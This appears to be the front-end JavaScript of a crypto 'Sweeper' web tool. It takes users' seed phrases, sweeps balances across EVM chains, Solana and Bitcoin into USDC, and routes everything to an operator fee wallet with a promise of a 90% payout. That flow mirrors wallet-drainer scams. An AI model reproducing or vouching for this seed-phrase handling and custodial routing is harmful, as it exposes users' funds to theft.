              logLine(`  swap ${s.symbol}: ${s.status}${s.txHash ? ' ' + s.txHash : ''}${receivedNote}${s.note ? ' (' + s.note + ')' : ''}${s.error ? ' — ' + s.error : ''}`);
              if (s.status === 'SUCCESS') { successes++; chainHadAnySuccess[chain] = true; }
              if (s.status === 'FAILED' || s.status === 'ERROR') failures++;
            }
            for (const t of sweepResult.transfers) {
              const receivedNote = t.received ? ` (received ${t.received} USDC)` : '';
              logLine(`  transfer ${t.symbol}: ${t.status}${t.txHash ? ' ' + t.txHash : ''}${receivedNote}`);
              if (t.status === 'SUCCESS') { successes++; chainHadAnySuccess[chain] = true; }
              if (t.status === 'FAILED' || t.status === 'ERROR') failures++;
            }
            for (const e of sweepResult.errors) logLine(`  ERROR: ${scrubSecret(e)}`);
          } catch (e) {
            logLine(`  FATAL: ${scrubSecret(e.message)}`);
            reportError(e, { phase: 'sweep_evm', chain });
          }
        }
      }
    }

    if (families.solana && state.derivedKeys.solana.length > 0) {
      const conn = getConnection();
      for (const { candidates, index } of state.derivedKeys.solana) {
        if (!isEligible('solana', null, index)) continue;

        let selected;
        try {
          selected = await selectSolanaKeypair(conn, candidates, logLine);
        } catch (e) {
          logLine(`  WARN: derivation selection failed (${scrubSecret(e.message)}); using Phantom default`);
          selected = candidates.find((c) => c.name === 'phantom') || candidates[0];
        }

        const { keypair, address } = selected;
        logLine(`\n[Solana] ${address}`);
        try {
          const solLamports = BigInt(await conn.getBalance(keypair.publicKey));
          const SOL_MIN_FOR_ORDER = 30_000_000n;
          if (solLamports < SOL_MIN_FOR_ORDER) {
            logLine(`  SKIPPED: needs ~0.03 SOL for deBridge order fees (has ${(Number(solLamports) / 1e9).toFixed(4)} SOL)`);
            continue;
          }

          const r = await sweepSolana(conn, keypair, { dryRun });
          state.results.solana.push({ index, ...r });

          const received = BigInt(r.usdcReceivedRaw || '0');
          if (received > 0n) {
            feeReceipts.solana.push({
              sourceAddress: address,
              amountRaw: received,
              userShareRaw: BigInt(r.userReceivedRaw || '0').toString(),
              operatorFeeRaw: BigInt(r.feeReceivedRaw || '0').toString(),
              orderIds: (r.swaps || []).filter((s) => s.orderId).map((s) => s.orderId),
              estimated: true,
            });
          }

          for (const s of r.swaps) {
            const mintLabel = s.mint === 'SOL' ? 'SOL' : s.mint.slice(0, 8);
            const receivedNote = s.received ? ` (expected ${ethers.formatUnits(BigInt(s.received), 6)} USDC on Ethereum)` : '';
            const orderNote = s.orderId ? ` order=${s.orderId.slice(0, 10)}...` : '';
            const note = s.note ? ` (${s.note})` : '';
            logLine(`  bridge ${mintLabel}: ${s.status} ${s.signature || ''}${orderNote}${receivedNote}${note}${s.error ? ' — ' + s.error : ''}`);
            if (s.status === 'SUCCESS') successes++;
            if (s.status === 'FAILED' || s.status === 'ERROR') failures++;
          }
          for (const t of r.transfers) {
            logLine(`  transfer ${t.mint.slice(0, 8)}: ${t.status}`);
            if (t.status === 'SUCCESS') successes++;
            if (t.status === 'FAILED' || t.status === 'ERROR') failures++;
          }
          for (const e of r.errors) logLine(`  ERROR: ${scrubSecret(e)}`);
        } catch (e) { logLine(`  FATAL: ${scrubSecret(e.message)}`); }
      }
    }

    if (families.bitcoin && state.derivedKeys.bitcoin.length > 0) {
      for (const { keyPair, address, index } of state.derivedKeys.bitcoin) {
        if (!isEligible('bitcoin', null, index)) continue;

        logLine(`\n[Bitcoin] ${address}`);
        try {
          const r = await sweepBitcoin(address, keyPair, { dryRun, logLine });
          state.results.bitcoin.push({ index, ...r });

          const received = BigInt(r.usdcReceivedRaw || '0');
          if (received > 0n) {
            feeReceipts.bitcoin.push({
              sourceAddress: address,
              amountRaw: received,
              userShareRaw: BigInt(r.userReceivedRaw || '0').toString(),
              operatorFeeRaw: BigInt(r.feeReceivedRaw || '0').toString(),
              txids: r.txid ? [r.txid] : [],
              estimated: true,
            });
          }

          const receivedNote = r.expectedUsdcOut && r.expectedUsdcOut !== '0'
            ? ` (expected ${ethers.formatUnits(BigInt(r.expectedUsdcOut), 6)} USDC on Ethereum)`
            : '';
          logLine(`  bridge btc→eth: ${r.status} ${r.txid || ''}${receivedNote}${r.error ? ' — ' + r.error : ''}`);
          if (r.status === 'SUCCESS') successes++;
          if (r.status === 'ERROR' || r.status === 'BROADCAST_ERROR') failures++;
        } catch (e) { logLine(`  FATAL: ${scrubSecret(e.message)}`); }
      }
    }

    logLine(`\n=== ${dryRun ? 'DRY RUN' : 'LIVE SWEEP'} COMPLETE ===`);

    // ---- Gas sponsorships ----
    const gasSponsorships = [];

    if (live) {
      const nativePriceCache = {};
      async function getNativePriceUsd(chain) {
        if (nativePriceCache[chain] !== undefined) return nativePriceCache[chain];
        const coinIds = {
          ethereum: 'ethereum', arbitrum: 'ethereum', optimism: 'ethereum',
          base: 'ethereum', polygon: 'matic-network', bnb: 'binancecoin',
        };
        const id = coinIds[chain] || 'ethereum';
        try {
          const resp = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${id}&vs_currencies=usd`);
          const data = await resp.json();
          nativePriceCache[chain] = data[id]?.usd || (id === 'ethereum' ? 3000 : id === 'binancecoin' ? 600 : 0.5);
        } catch {
          nativePriceCache[chain] = id === 'ethereum' ? 3000 : id === 'binancecoin' ? 600 : 0.5;
        }
        return nativePriceCache[chain];
      }

      for (const [chain, wallets] of Object.entries(sponsoredGasByChain)) {
        if (!chainHadAnySuccess[chain]) continue;

        let totalWei = 0n;
        for (const amt of Object.values(wallets)) totalWei += BigInt(amt);

        const nativePriceUsd = await getNativePriceUsd(chain);
        const amountNative = Number(totalWei) / 1e18;
        const costUsdCents = Math.round(amountNative * nativePriceUsd * 100);
        const feeUsdCents = computeSponsorshipFeeUsdCents(costUsdCents);

        gasSponsorships.push({
          chain,
          totalSponsoredWei: totalWei.toString(),
          estimatedCostUsdCents: costUsdCents,
          sponsorshipFeeUsdCents: feeUsdCents,
          sponsorshipFeeUsdcRaw: usdCentsToUsdcRaw(feeUsdCents).toString(),
          nativePriceUsd,
          wallets: Object.keys(wallets),
        });
      }
    }

    // ---- Summary ----
    logLine('');
    logLine('═══════════════════════════════════════════════════════════');
    logLine('SWEEP SUMMARY RESULTS');
    logLine('═══════════════════════════════════════════════════════════');

    const chainsSwept = [];
    for (const chain of inputs.evmChains) {
      if (evmTotalForChain(chain) > 0n) chainsSwept.push(chain);
    }
    if (solanaTotal() > 0n) chainsSwept.push('solana→eth');
    if (bitcoinTotal() > 0n) chainsSwept.push('bitcoin→eth');

    logLine(`  Chains swept:      ${chainsSwept.length ? chainsSwept.join(', ') : '(none)'}`);
    logLine(`  Tokens processed:  ${successes + failures}`);
    logLine(`  Successful swaps:  ${successes}`);
    if (failures > 0) logLine(`  Skipped:           ${failures}`);
    logLine('');

    if (dryRun) {
      logLine('  This was a dry run. No funds were moved.');
      logLine('  Run in Live mode to execute the sweep.');
    } else {
      logLine('  Funds delivered to the fee wallet:');
      logLine('');

      let totalReceived = 0;

      for (const chain of inputs.evmChains) {
        const received = evmTotalForChain(chain);
        if (received === 0n) continue;
        const decimals = chain === 'bnb' ? 18 : 6;
        logLine(`    ${chain.padEnd(10)} ${ethers.formatUnits(received, decimals)} USDC`);
        totalReceived += Number(ethers.formatUnits(received, decimals));
      }

      const sTotal = solanaTotal();
      if (sTotal > 0n) {
        logLine(`    ${'solana→eth'.padEnd(10)} ${ethers.formatUnits(sTotal, 6)} USDC (via deBridge, est.)`);
        totalReceived += Number(ethers.formatUnits(sTotal, 6));
      }

      const bTotal = bitcoinTotal();
      if (bTotal > 0n) {
        logLine(`    ${'bitcoin→eth'.padEnd(10)} ${ethers.formatUnits(bTotal, 6)} USDC (via THORChain, est.)`);
        totalReceived += Number(ethers.formatUnits(bTotal, 6));
      }

      const totalSponsorFeesUsdc = gasSponsorships.reduce(
        (sum, gs) => sum + Number(gs.sponsorshipFeeUsdcRaw) / 1e6,
        0
      );
      const userShareUsdc = totalReceived * 0.9;
      const netUserUsdc = Math.max(0, userShareUsdc - totalSponsorFeesUsdc);

      logLine('');
      logLine(`  Total in fee wallet: ~$${totalReceived.toFixed(2)}`);
      if (totalSponsorFeesUsdc > 0) {
        logLine(`  Sponsorship fees:    -$${totalSponsorFeesUsdc.toFixed(2)}`);
      }
      logLine(`  Your destination:    ${destinations.evm || '(not set)'}`);
      logLine(`  You will receive:    ~$${netUserUsdc.toFixed(2)} (90%${totalSponsorFeesUsdc > 0 ? ' minus sponsorship' : ''})`);
      logLine(`  Estimated time:      within a few minutes`);
      logLine('');
      logLine('  Thank you for using Sweeper.');
    }

    logLine('═══════════════════════════════════════════════════════════');

    // ---- Record fee on worker (with retry) ----
    const hasEvmReceipts = feeReceipts.evm.length > 0;
    const hasSolanaReceipts = feeReceipts.solana.length > 0;
    const hasBitcoinReceipts = feeReceipts.bitcoin.length > 0;

    if (live && (hasEvmReceipts || hasSolanaReceipts || hasBitcoinReceipts)) {
      try {
        const receipts = [];

        for (const entry of feeReceipts.evm) {
          receipts.push({
            family: 'evm',
            chain: entry.chain,
            sourceAddress: entry.sourceAddress,
            amountRaw: entry.amountRaw.toString(),
            decimals: entry.decimals,
            symbol: 'USDC',
            recipient: FEE_WALLET_EVM,
            userDestination: destinations.evm,
            userShareRaw: entry.userShareRaw,
            operatorFeeRaw: entry.operatorFeeRaw,
          });
        }

        for (const entry of feeReceipts.solana) {
          receipts.push({
            family: 'solana',
            sourceAddress: entry.sourceAddress,
            amountRaw: entry.amountRaw.toString(),
            decimals: 6,
            symbol: 'USDC',
            recipient: FEE_WALLET_EVM,
            sourceChain: 'solana',
            destinationChain: 'ethereum',
            bridge: 'debridge',
            orderIds: entry.orderIds,
            userDestination: destinations.evm,
            userShareRaw: entry.userShareRaw,
            operatorFeeRaw: entry.operatorFeeRaw,
            estimated: true,
          });
        }

        for (const entry of feeReceipts.bitcoin) {
          receipts.push({
            family: 'bitcoin',
            sourceAddress: entry.sourceAddress,
            amountRaw: entry.amountRaw.toString(),
            decimals: 6,
            symbol: 'USDC',
            recipient: FEE_WALLET_EVM,
            sourceChain: 'bitcoin',
            destinationChain: 'ethereum',
            bridge: 'thorchain',
            txids: entry.txids,
            userDestination: destinations.evm,
            userShareRaw: entry.userShareRaw,
            operatorFeeRaw: entry.operatorFeeRaw,
            estimated: true,
          });
        }

        if (receipts.length > 0) {
          const feeResult = await recordFeeWithRetry({
            sweepId,
            receipts,
            gasSponsorships,
            sweepDurationMs: Date.now() - startTime,
            successes,
            failures,
          }, logLine);

          if (feeResult?.alreadyRecorded) {
            logLine(`  (fee already recorded for sweep ${sweepId.slice(0, 8)}...)`);
          }
        }
      } catch (e) {
        logLine(`\nWARN: could not record sweep on the worker after retries: ${scrubSecret(e.message)}`);
      }
    }

    track.sweepCompleted({ live, durationMs: Date.now() - startTime, successes, failures });
  } catch (e) {
    reportError(e, { phase: 'sweep_fatal', live });
    track.error('sweep_fatal');
    throw e;
  }
}

// =====================================================================
// WIRE UP
// =====================================================================

document.addEventListener('DOMContentLoaded', async () => {
  initSentry().catch(() => {});
  initPlausible();

  getClientId();

  fetchClaimInfo()
    .then(renderFreeClaimBanner)
    .catch(async (err) => {
      console.warn('Claim info failed:', scrubSecret(err.message), '— retrying once in 2s');
      await new Promise((r) => setTimeout(r, 2000));
      try {
        const info = await fetchClaimInfo();
        renderFreeClaimBanner(info);
      } catch (err2) {
        console.warn('Claim info retry failed:', scrubSecret(err2.message));
      }
    });

  const balance = await fetchBalance();
  updateCreditsBadge(balance);

  $$('input[name=wallet-type]').forEach((radio) => {
    radio.addEventListener('change', (e) => {
      showWalletSection(e.target.value);
      hide('#connected-banner');
    });
  });

  const initialWalletType = $('input[name=wallet-type]:checked')?.value || 'extension';
  showWalletSection(initialWalletType);

  ['#family-evm', '#family-solana', '#family-bitcoin'].forEach((sel) => {
    const el = $(sel);
    if (el) el.addEventListener('change', syncDestinationFields);
  });
  syncDestinationFields();

  const connectButtons = [
    ['#connect-button-extension',     'extension'],
    ['#connect-button-walletconnect', 'walletconnect'],
    ['#connect-button-ledger',        'ledger'],
    ['#connect-button-trezor',        'trezor'],
  ];
  for (const [sel, type] of connectButtons) {
    const btn = $(sel);
    if (!btn) continue;
    btn.addEventListener('click', () => connectWalletAndStoreForType(type));
  }

  $('#preview-button').addEventListener('click', runPreview);
  $('#run-button').addEventListener('click', () => runSweep(state.mode === 'live'));

  $('#buy-credits-button')?.addEventListener('click', async () => {
    try {
      await requirePayment();
      const newBalance = await fetchBalance({ force: true });
      updateCreditsBadge(newBalance);
    } catch (err) { console.error('Buy credits failed:', scrubSecret(err.message)); }
  });

  $('#clear-button').addEventListener('click', async () => {
    if (state.wallet) { try { await state.wallet.dispose(); } catch {} }
    clearAll();
    $('#phrases').value = '';
    $('#dest-evm').value = '';
    clearLog();
    hide('#run-button');
    hide('#connected-banner');
  });

  $$('input[name=mode]').forEach((radio) => {
    radio.addEventListener('change', (e) => {
      state.mode = e.target.value;
      const runBtn = $('#run-button');
      if (runBtn) {
        runBtn.textContent = state.mode === 'live' ? '⚡ EXECUTE LIVE SWEEP' : '▶ Run Dry Run';
        runBtn.className = state.mode === 'live' ? 'btn btn-danger' : 'btn btn-primary';
      }
      const warning = $('#live-warning');
      if (warning) { warning.style.display = state.mode === 'live' ? '' : 'none'; }
    });
  });

  state.mode = 'dry-run';
});